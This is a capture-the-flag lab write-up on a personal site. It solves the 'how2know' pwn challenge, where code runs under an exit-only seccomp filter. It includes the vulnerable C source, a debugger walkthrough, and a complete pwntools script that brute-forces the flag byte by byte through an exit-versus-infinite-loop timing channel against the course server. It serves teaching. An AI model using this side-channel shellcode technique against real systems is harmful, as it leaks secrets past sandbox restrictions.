<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN - 0x13(Lab - how2know)
  #


  tags: CTF PWN eductf
  #

challenge: nc edu-ctf.zoolab.org 10002
Environment Version: 22.04

  Original Code
  #

:::spoiler code
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <stdlib.h>

static char flag[0x30];

int main()
{
    void *addr;
    int fd;
    scmp_filter_ctx ctx;

    addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((unsigned long)addr == -1)
        perror("mmap"), exit(1);
    
    fd = open("/home/chal/flag", O_RDONLY);
    if (fd == -1)
        perror("open"), exit(1);
    read(fd, flag, 0x30);
    close(fd);

    write(1, "talk is cheap, show me the code\n", 33);
    read(0, addr, 0x1000);

    ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    ((void(*)())addr)();

    return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN - 0x13(Lab - `how2know`)"><meta property="og:description" content='Simple PWN - 0x13(Lab - how2know) # tags: CTF PWN eductf # challenge: nc edu-ctf.zoolab.org 10002 Environment Version: 22.04
Original Code # :::spoiler code
#include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <seccomp.h> #include <sys/mman.h> #include <stdlib.h> static char flag[0x30]; int main() { void *addr; int fd; scmp_filter_ctx ctx; addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if ((unsigned long)addr == -1) perror("mmap"), exit(1); fd = open("/home/chal/flag", O_RDONLY); if (fd == -1) perror("open"), exit(1); read(fd, flag, 0x30); close(fd); write(1, "talk is cheap, show me the code\n", 33); read(0, addr, 0x1000); ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_load(ctx); seccomp_release(ctx); ((void(*)())addr)(); return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN - 0x13(Lab - `how2know`) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN - 0x13(Lab - `how2know`)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a><ul><li><a href=#description--preliminary-idea>Description & Preliminary idea</a></li></ul></li><li><a href=#exploit---brute-force--assembly-instruction>Exploit - brute force + assembly instruction</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn---0x13lab---how2know>Simple PWN - 0x13(Lab - <code>how2know</code>)
<a class=anchor href=#simple-pwn---0x13lab---how2know>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10002</code>
Environment Version: 22.04</p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;seccomp.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;stdlib.h&gt;

static char flag[0x30];

int main()
{
    void *addr;
    int fd;
    scmp_filter_ctx ctx;

    addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((unsigned long)addr == -1)
        perror(&#34;mmap&#34;), exit(1);
    
    fd = open(&#34;/home/chal/flag&#34;, O_RDONLY);
    if (fd == -1)
        perror(&#34;open&#34;), exit(1);
    read(fd, flag, 0x30);
    close(fd);

    write(1, &#34;talk is cheap, show me the code\n&#34;, 33);
    read(0, addr, 0x1000);

    ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    ((void(*)())addr)();

    return 0;
}
</code></pre><p>:::</p><pre tabindex=0><code class=language-make! data-lang=make!>gcc -o chal how2know.c -lseccomp
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ checksec chal
[*] &#39;/home/sbk6401/NTUCS/PWN/Lab/how2know/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ seccomp-tools dump ./chal
talk is cheap, show me the code
123
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0007
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre><ul><li>Note that, if you want to use <code>seccomp-tools</code>, you should modify <code>/home/chal/flag</code> to <code>./flag</code></li><li>It just allow <code>exit</code> function</li></ul><h3 id=description--preliminary-idea>Description & Preliminary idea
<a class=anchor href=#description--preliminary-idea>#</a></h3><ul><li>At line 16, it create a writable, readable and executable space with size <code>0x1000</code></li><li>And it read the flag to global variable without buffer overflow</li><li>Then it allow us to write something to <code>addr</code> memory space</li><li>In addition, turn on <code>seccomp</code> rules to protect itself</li><li><font color=FF0000><strong>MOST IMPORTANT AT LINE 35</strong></font>: it&rsquo;ll call <code>addr</code> as function</li><li>So, the preliminary idea is to put some instructions to <code>addr</code> and it&rsquo;ll execute at line 35</li></ul><h2 id=exploit---brute-force--assembly-instruction>Exploit - brute force + assembly instruction
<a class=anchor href=#exploit---brute-force--assembly-instruction>#</a></h2><ol><li><p>Observe register and try to leak flag info.</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gdb chal
&gt;pwndbg b main
&gt;pwndbg r
&gt;pwndbg b *main+337
&gt;pwndbg c
</code></pre><p><img src=https://imgur.com/avi7T2U.png alt>
We can see that in <code>$r13</code> store <code>0x555555555289 (main) ◂— endbr64</code> and we can aware of the truly address of variable <code>flag</code> by using vmmap.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>pwndbg&gt; vmmap
</span></span><span style=display:flex><span>pwndbg&gt; x/100s 0x555555558000
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>0x555555558040 &lt;flag&gt;:  <span style=color:#e6db74>&#34;FLAG{test_1235s456fasdjknisjsdfkl45641233f1234}\n&#34;</span>
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p><img src=https://imgur.com/qQcl5gY.png alt>
So, we can knew the distance of these two address is <font color=FF0000><strong><code>0x2db7</code></strong></font></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> hex(<span style=color:#ae81ff>0x555555558040</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x555555555289</span>)
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;0x2db7&#39;</span>
</span></span></code></pre></div><p>exploit: move the first 8 bytes to <code>$rax</code></p><pre tabindex=0><code class=language-assembly! data-lang=assembly!>mov r10, r13
add r10, 0x2db7
mov rax, [r10]
</code></pre><p><img src=https://imgur.com/OxBoyoK.png alt></p><ul><li>Note that, if you&rsquo;d like to move next 8 bytes to <code>$rax</code>, rewrite <code>[r10]</code> to <code>[r10+0x8]</code></li></ul></li><li><p>Compare the single char by brute force
If the result of comparison is correct, the system will call <code>sys_exit</code> with <code>error_code=0</code>, otherwise, access to infinity loop.
We start from <code>0x20</code> on ascii table and end at <code>0x80</code>
Especially, when the comparison is correct, we have to shift <code>$rax</code> with 8 bits and start to compare next single char</p><pre tabindex=0><code class=language-assembly! data-lang=assembly!>    mov cl, &#39;&#39;&#39; + str(guess) + &#39;&#39;&#39;
    shr rax, &#39;&#39;&#39; + str(8*shift_count) + &#39;&#39;&#39;
Compare:
    cmp al, cl
    je the_same
infinity1:
    jmp infinity1
the_same:
    mov rax, 0x3c
    mov rdi, 0
    syscall
</code></pre><p><img src=https://upload.wikimedia.org/wikipedia/commons/1/1b/ASCII-Table-wide.svg alt></p></li><li><p>Send the shellcode to <code>addr</code> global variable
The trickiest things is you must add <code>\x00</code> at the end of received strings and the reason is for the control flow next.</p><pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(b&#34;code\n\x00&#34;, shellcode)
</code></pre></li><li><p>How to know the single char in pwntool side?
If compare correct, the program will exit directly and pwntools will trigger timeout function and do the exception, at the same time, we can clearly aware of the what is the current single char is, otherwise, the guess will increase and do the next comparison.</p><pre tabindex=0><code class=language-python! data-lang=python!>try :
    # If compare not correct, guess++ and access to infinity loop
    r.recv(timeout=0.2)
    print(&#39;not the same&#39;)
    guess += 1
except:
    # If compare correct, pwntool will break out
    print(&#39;the same&#39;)
    break
r.close()
</code></pre></li><li><p>Repeat
<code>shift_count</code> can not over 7 is because the biggest size that <code>$rax</code> can store is 8 bytes</p><pre tabindex=0><code class=language-python! data-lang=python!>flag = &#39;&#39;
shift_count = 0
while shift_count &lt; 8:
    guess = 0x20
    while guess &lt; 0x80 :
        {create shellcode}
        {send shellcode}

        try:
            ...
        except:
            ...
        r.close()
    shift_count += 1
    flag += chr(guess)
print(flag)
r.interactive()
</code></pre></li></ol><ul><li>Whole exploit
:::spoiler code<pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *

# r = process(&#39;./chal&#39;)
context.arch = &#39;amd64&#39;

flag = &#39;&#39;
shift_count = 0
while shift_count &lt; 8:
    guess = 0x20
    while guess &lt; 0x80 :
        # r = process(&#39;./chal&#39;)
        r = remote(&#39;edu-ctf.zoolab.org&#39;,10002)
        shellcode = asm(&#39;&#39;&#39;
            mov r10, r13
            add r10, 0x2db7
            mov rax, [r10]
            mov cl, &#39;&#39;&#39; + str(guess) + &#39;&#39;&#39;
            shr rax, &#39;&#39;&#39; + str(8*shift_count) + &#39;&#39;&#39;
        Compare:
            cmp al, cl
            je the_same
        infinity1:
            jmp infinity1
        the_same:
            mov rax, 0x3c
            mov rdi, 0
            syscall
        &#39;&#39;&#39;)
        # raw_input()
        r.sendafter(b&#34;code\n\x00&#34;, shellcode)
        try :
            # If compare not correct, guess++ and access to infinity loop
            r.recv(timeout=0.2)
            print(&#39;not the same&#39;)
            guess += 1
        except:
            # If compare correct, pwntool will break out
            print(&#39;the same&#39;)
            break
        # raw_input()
        r.close()

    shift_count += 1
    flag += chr(guess)
print(flag)
r.interactive()
</code></pre>:::</li><li><font color=FF0000>Note that</font>: I create 6 multi-threads to execute the exploit program simultaneously with a little bit difference
1st thread: <code>mov rax, [r10]</code> output:FLAG{pia
2nd thread: <code>mov rax, [r10+0x8]</code> output:no_d113f
3rd thread: <code>mov rax, [r10+0x10]</code> output:1c3f9ed8
4th thread: <code>mov rax, [r10+0x18]</code> output:019288f4
5th thread: <code>mov rax, [r10+0x20]</code> output:e8ddecfb
6th thread: <code>mov rax, [r10+0x28]</code> output:8ec}
FLAG{piano_d113f1c3f9ed8019288f4e8ddecfb8ec}</li></ul><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://www.cnblogs.com/bittorrent/p/3267736.html>linux 中mmap的用法</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#original-code>Original Code</a><ul><li><a href=#description--preliminary-idea>Description & Preliminary idea</a></li></ul></li><li><a href=#exploit---brute-force--assembly-instruction>Exploit - brute force + assembly instruction</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>